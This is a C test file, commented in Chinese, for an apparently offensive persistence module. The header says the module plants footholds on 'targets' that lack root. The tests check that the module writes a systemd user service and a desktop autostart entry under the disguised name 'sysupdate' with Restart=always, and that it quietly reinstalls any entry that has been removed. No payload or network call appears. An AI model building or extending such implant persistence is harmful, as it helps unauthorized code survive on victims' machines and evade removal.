/* 用户级驻留守卫：非 root 目标专用路径。
 *
 * 存在意义：既有 10 种机制在 Linux 侧全是系统级（写 /etc、/var/spool），
 * 非 root 目标上**一条都装不上**。随机目标拿不到 root 的概率很高，
 * 那种目标上整套部署此前直接归零。本测试锁死用户级降级路径。
 *
 * 关键点：全程用 HOME 指向临时目录 + root_prefix=NULL，不污染真实 HOME。
 */
#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include "persist.h"

static int pass = 0, fail = 0;
static void ck(const char *name, int cond) {
    if (cond) { pass++; printf("  ok  : %s\n", name); }
    else      { fail++; printf("  FAIL: %s\n", name); }
}

static int is_installed(persist_method_t m) {
    return persist_installed(NULL, m) == 1;
}

static void rm_rf(const char *p) {
    char cmd[1024];
    snprintf(cmd, sizeof cmd, "rm -rf '%s' 2>/dev/null", p);
    int r = system(cmd);
    (void)r;
}

int main(void) {
    char home[] = "/tmp/.pu_test_XXXXXX";
    if (!mkdtemp(home)) { printf("mkdtemp failed\n"); return 2; }

    /* HOME 必须在调用前设置：persist_user_ensure 从环境读取落点 */
    setenv("HOME", home, 1);
    if (persist_set_service_name("sysupdate") != 0) return 2;

    printf("HOME=%s\n", home);

    /* ---- 生成内容正确性 ---- */
    char buf[4096];
    size_t n = persist_generate(PERSIST_USER_SYSTEMD, "/usr/local/bin/sysupdate",
                                buf, sizeof buf);
    ck("user_systemd 可生成", n > 0);
    /* 用户级单元必须是 default.target。写成 multi-user.target 会让 enable
     * 报 "not found" 或静默不生效，而文件本身完全合法——肉眼不可辨。 */
    ck("WantedBy=default.target（非 multi-user）",
       strstr(buf, "WantedBy=default.target") != NULL &&
       strstr(buf, "multi-user.target") == NULL);
    ck("含 Restart=always", strstr(buf, "Restart=always") != NULL);
    ck("ExecStart 指向落点", strstr(buf, "/usr/local/bin/sysupdate") != NULL);

    n = persist_generate(PERSIST_AUTOSTART, "/usr/local/bin/sysupdate",
                         buf, sizeof buf);
    ck("autostart 可生成", n > 0);
    ck("autostart 含 Hidden=false", strstr(buf, "Hidden=false") != NULL);
    ck("autostart 含 X-GNOME-Autostart-enabled",
       strstr(buf, "X-GNOME-Autostart-enabled=true") != NULL);
    ck("autostart 含 Exec=", strstr(buf, "Exec=/usr/local/bin/sysupdate") != NULL);

    /* ---- 首次安装 ---- */
    char bin[512]; int methods[2] = {0, 0};
    int rc = persist_user_ensure(NULL, bin, sizeof bin, methods, 2);
    ck("首次 ensure 返回 0（新装）", rc == 0);
    ck("user_systemd 已装", is_installed(PERSIST_USER_SYSTEMD));
    ck("autostart 已装", is_installed(PERSIST_AUTOSTART));
    ck("out_methods[0]=1", methods[0] == 1);
    ck("out_methods[1]=1", methods[1] == 1);
    ck("回填了落盘路径", bin[0] != '\0');

    /* ---- 幂等 ---- */
    int methods2[2] = {0, 0};
    int rc2 = persist_user_ensure(NULL, bin, sizeof bin, methods2, 2);
    ck("二次 ensure 返回 1（已驻留，幂等）", rc2 == 1);

    /* ---- 部分成功：卸掉一项后仍应判定为已驻留，不判失败 ---- */
    persist_uninstall(PERSIST_AUTOSTART, NULL, bin);
    ck("卸载 autostart 后确实不在位", !is_installed(PERSIST_AUTOSTART));
    int methods3[2] = {0, 0};
    int rc3 = persist_user_ensure(NULL, bin, sizeof bin, methods3, 2);
    ck("部分成功返回 0/1 而非 -1", rc3 == 0 || rc3 == 1);
    ck("部分成功后 autostart 被补装", is_installed(PERSIST_AUTOSTART));

    /* ---- 全卸后必须能重新装上（防判定退化成恒返回 1）---- */
    persist_uninstall(PERSIST_USER_SYSTEMD, NULL, bin);
    persist_uninstall(PERSIST_AUTOSTART, NULL, bin);
    ck("全卸后两项均不在位",
       !is_installed(PERSIST_USER_SYSTEMD) && !is_installed(PERSIST_AUTOSTART));
    int rc4 = persist_user_ensure(NULL, bin, sizeof bin, NULL, 0);
    ck("全卸后 ensure 返回 0（新装，非恒 1）", rc4 == 0);

    /* ---- HOME 不可用时必须真失败（故障要在安装阶段暴露）----
     *
     * 构造"路径存在但不是目录"（HOME 被误设成一个文件，配置错误场景）。
     *
     * 不能用 chmod 000 模拟不可写：本测试以 root 运行时 root 无视权限位，
     * 那条路径照样可写，断言会假通过。也不能只测"目录不存在"——实现里
     * 对不存在的 HOME 会 mkdir_p 创建，那是刻意行为（部分环境 HOME 指向
     * 尚未创建的目录），断言"不存在即失败"反而与实现冲突。 */
    char badfile[] = "/tmp/.pu_file_XXXXXX";
    int fd = mkstemp(badfile);
    if (fd >= 0) {
        close(fd);
        setenv("HOME", badfile, 1);
        int rc5 = persist_user_ensure(NULL, bin, sizeof bin, NULL, 0);
        ck("HOME 非目录时返回 -1（真失败）", rc5 == -1);
        unlink(badfile);
    }

    rm_rf(home);
    printf("--- total=%d pass=%d fail=%d ---\n", pass + fail, pass, fail);
    return fail ? 1 : 0;
}
